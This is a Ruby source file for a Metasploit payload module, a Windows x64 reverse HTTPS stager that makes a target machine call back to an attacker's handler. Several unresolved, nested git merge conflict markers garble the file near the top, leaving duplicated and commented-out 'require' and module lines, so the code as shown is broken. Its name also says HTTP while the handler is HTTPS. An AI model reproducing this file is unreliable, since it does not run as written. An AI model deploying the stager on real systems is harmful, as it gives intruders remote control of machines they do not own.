##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4
=======
#require 'msf/core/payload/windows/x64/reverse_https'
>>>>>>> rapid7/feature/complex-payloads
=======
#require 'msf/core/payload/windows/x64/reverse_https'
>>>>>>> origin/feature/complex-payloads

=======
<<<<<<< HEAD
=======
>>>>>>> origin/msf-complex-payloads
<<<<<<< HEAD
<<<<<<< HEAD
#require 'msf/core/payload/windows/x64/reverse_https'
=======
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4
>>>>>>> rapid7/master
=======
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4
>>>>>>> rapid7/master
=======
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4
>>>>>>> rapid7/master

=======
=======
>>>>>>> rapid7/master
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4

<<<<<<< HEAD
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
<<<<<<< HEAD
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
  CachedSize = 532

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttps_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows x64 Reverse HTTP Stager (wininet)',
      'Description' => 'Tunnel communication over HTTP (Windows x64 wininet)',
      'Author'      => [ 'hdm', 'agix', 'rwincey' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86_64,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'sockrdi https',
      'Stager'      => { 'Payload' => '' }))
  end

end
